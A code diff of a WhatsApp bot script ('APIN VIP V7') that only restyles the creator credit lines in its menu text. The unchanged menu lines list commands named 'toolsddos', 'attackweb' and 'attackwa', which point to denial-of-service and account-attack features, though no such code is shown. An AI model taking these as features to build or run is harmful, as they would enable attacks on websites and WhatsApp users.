 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2500,7 +2443,8 @@ m.reply(`─✈
 ││✑${prefix}wangy
 ││✑${prefix}cekmati
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 }
@@ -2512,16 +2456,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2596,7 +2535,8 @@ m.reply(`─✈
 ││✑${prefix}galaxystyle *namalu*
 ││✑${prefix}lighteffects *namalu*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -2608,16 +2548,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2641,7 +2576,8 @@ m.reply(`─✈
 ││✑${prefix}listsrv
 ││✑${prefix}listusr
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -2653,16 +2589,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2725,7 +2656,8 @@ m.reply(`─✈
 ││✑${prefix}tsunade
 ││✑${prefix}yukiyuki
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -2737,16 +2669,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2777,7 +2704,8 @@ m.reply(`─✈
 ││✑${prefix}proses *reply/pesan*
 ││✑${prefix}done *reply/pesan*
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -2789,16 +2717,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2822,7 +2745,8 @@ m.reply(`─✈
 ││✑${prefix}txtunbantinjau
 ││✑${prefix}toolsddos
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2833,16 +2757,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2866,7 +2785,8 @@ m.reply(`─✈
 *GMAIL PIHAK WA*
 ││✑${prefix}gmailwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2877,16 +2797,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2910,7 +2825,8 @@ m.reply(`─✈
 *GMAIL PIHAK WA*
 ││✑${prefix}gmailwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2920,16 +2836,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2953,7 +2864,8 @@ m.reply(`─✈
 *GMAIL PIHAK WA*
 ││✑${prefix}gmailwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -2963,16 +2875,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -2996,7 +2903,8 @@ m.reply(`─✈
 *GMAIL PIHAK WA*
 ││✑${prefix}gmailwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 
@@ -3006,16 +2914,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3037,7 +2940,8 @@ m.reply(`─✈
 *GMAIL PIHAK WA*
 ││✑${prefix}gmailwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 break
 //=================================================//
@@ -3047,16 +2951,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -3076,7 +2975,8 @@ m.reply(`─✈
 ││✑${prefix}attackweb
 ││✑${prefix}attackwa
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`)
 }
 break
@@ -3087,16 +2987,11 @@ m.reply(`─✈
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
